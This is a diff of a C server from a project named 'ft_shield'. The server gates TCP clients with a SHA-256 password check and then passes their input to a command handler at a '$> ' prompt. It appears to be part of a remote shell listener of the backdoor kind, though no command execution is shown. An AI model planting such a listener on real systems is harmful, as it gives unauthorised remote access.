@@ -1,6 +1,6 @@
 #include <ft_shield.h>
 
-static void remove_client(t_server *server, int client_fd)
+void remove_client(t_server *server, int client_fd)
 {
     printf("[ REMOVING ] client: %d\n", client_fd);
     for (int i = 0; i < MAX_CLIENTS; i++) {
@@ -14,7 +14,7 @@ static void remove_client(t_server *server, int client_fd)
     }
 }
 
-void _handle_client_input(t_server *server, int pfd_index)
+static void _handle_client_input(t_server *server, int pfd_index)
 {
     int len_read;
 	char buffer[BUFFER_SIZE];
@@ -29,16 +29,15 @@ void _handle_client_input(t_server *server, int pfd_index)
     {
             unsigned char password_hash[SHA256_DIGEST_LENGTH];
             hash_sha256(buffer, password_hash);
-            if (compare_hashes(password_hash)) {
+            if (check_password(password_hash)) {
                 server->clients[pfd_index].logged = 1;
+                send_to_client(server, server->pfds[pfd_index].fd, "$> ");
             }
             else
-            {
-                if (send(server->pfds[pfd_index].fd, "Password: ", 10, 0) == -1)
-                    remove_client(server, server->pfds[pfd_index].fd);
-            }
-    } else{
-        printf("YOU'RE LOGGED\n");
+                send_to_client(server, server->pfds[pfd_index].fd, "Password: ");
+    } else {
+        handle_command(server, server->pfds[pfd_index].fd, buffer);
+        send_to_client(server, server->pfds[pfd_index].fd, "$> ");
     }
 }
 
@@ -65,12 +64,10 @@ static void _handle_connection(t_server *server)
             break;
         }
     }
-    printf("NEW_CLIENT: %d -> %d\n", client_fd, server->connected_clients);
-    if (send(client_fd, "Password: ", 10, 0) == -1)
-        remove_client(server, client_fd);
+    send_to_client(server, client_fd, "Password: ");
 }
 
-void loop_server(t_server *server)
+static void loop_server(t_server *server)
 {
     while (1)
     {
@@ -137,4 +134,10 @@ void server(void)
     server.server_socket = setup_server();
     server.pfds[0] = (struct pollfd){server.server_socket, POLLIN, 0};
     loop_server(&server);
+}
+
+void send_to_client(t_server* server, int client_fd, char* buffer)
+{
+    if (send(client_fd, buffer, strlen(buffer), 0) == -1)
+        remove_client(server, client_fd);
 }
